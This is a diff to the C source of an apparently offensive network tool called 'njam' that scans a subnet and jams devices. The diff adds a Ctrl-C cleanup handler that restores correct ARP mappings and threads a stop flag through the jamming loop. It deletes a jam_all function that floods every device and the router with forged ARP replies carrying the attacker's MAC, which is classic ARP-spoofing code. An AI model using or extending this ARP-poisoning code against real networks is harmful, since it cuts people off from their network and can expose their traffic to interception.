@@ -12,6 +12,7 @@
 #include <string.h>
 #include <stdint.h>
 #include <unistd.h>
+#include <signal.h>
 
 #include <arpa/inet.h>
 
@@ -19,6 +20,39 @@
 #ifndef VERSION
 #define VERSION "unknown"
 #endif
+
+volatile bool stop_flag = false;
+Network *global_network = NULL;
+pthread_t jam_thread;
+int sockfd_scanner = -1;
+
+void handle_sigint(int signum) {
+    (void)signum;
+    printf(TOP_LEFT_CODE);
+    printf(CLEAR_SCREEN_CODE);
+    printf("Cleaning up, can take up to 10 seconds\n");
+    printf("Program is sending correct arp mapings to devices\n");
+
+    if (global_network) {
+        pthread_mutex_lock(&global_network->lock);
+        for (size_t i=0;i<global_network->device_count;i++) {
+            Device *device = &global_network->devices[i];
+            if (device->status == JAMMING){
+                device->status = DISCONNECTING;
+            }
+        }
+        pthread_mutex_unlock(&global_network->lock);
+
+        stop_flag = true;
+        pthread_join(jam_thread, NULL);
+
+        close(sockfd_scanner);
+        free_network(*global_network);
+        disable_raw_mode();
+    }
+    global_network = NULL;
+    exit(0);
+}
 
 
 bool get_ip_and_mask(const char *arg, uint32_t *ip, uint32_t *mask) {
@@ -37,29 +71,13 @@ bool get_ip_and_mask(const char *arg, uint32_t *ip, uint32_t *mask) {
     return ip_str_to_uint32(ip_str, ip) && parse_mask_length(mask_str, mask);
 }
 
-void jam_all(Network network, int sockfd, uint8_t *my_mac) {
-    Device *router = &network.devices[0];
-    uint32_t router_ip = htonl(router->ip);
-    while(1) {
-        for (size_t index = 1;index<network.device_count;index++) {
-            Device *device = &network.devices[index];
-
-            uint32_t device_ip = htonl(device->ip);
-            
-
-            arp_send_reply(sockfd, "wlan0", my_mac, &device_ip, router->mac, &router_ip);
-            arp_send_reply(sockfd, "wlan0", my_mac, &router_ip, device->mac, &device_ip);
-        }
-        sleep(2);
-    }
-}
-
-
 int main(int argc, char *argv[]){
     if (argc < 2) {
         printf("Usage: njam <IP-Address>/<Subnet>\n");
         return EXIT_FAILURE;
     }
+
+    signal(SIGINT, handle_sigint);
 
     uint32_t ip;
     uint32_t mask;
@@ -70,13 +88,17 @@ int main(int argc, char *argv[]){
     }
 
     Network network = create_network(ip, mask);
+    global_network = &network;
 
-    pthread_t jam_thread;
-    pthread_create(&jam_thread, NULL, jam_jammed_devices, &network);
+    JammerArgs args = {
+        .network = &network,
+        .stop_flag = &stop_flag
+    };
+    pthread_create(&jam_thread, NULL, jam_jammed_devices, &args);
 
-    int sockfd_scanner = arp_create_socket();
-    scanner_process(network, sockfd_scanner, ip);
-    
-    close(sockfd_scanner);
-    free_network(network);
+    sockfd_scanner = arp_create_socket();
+    if (sockfd_scanner != -1){
+        scanner_process(network, sockfd_scanner, ip);
+    }
+    handle_sigint(0);
 }
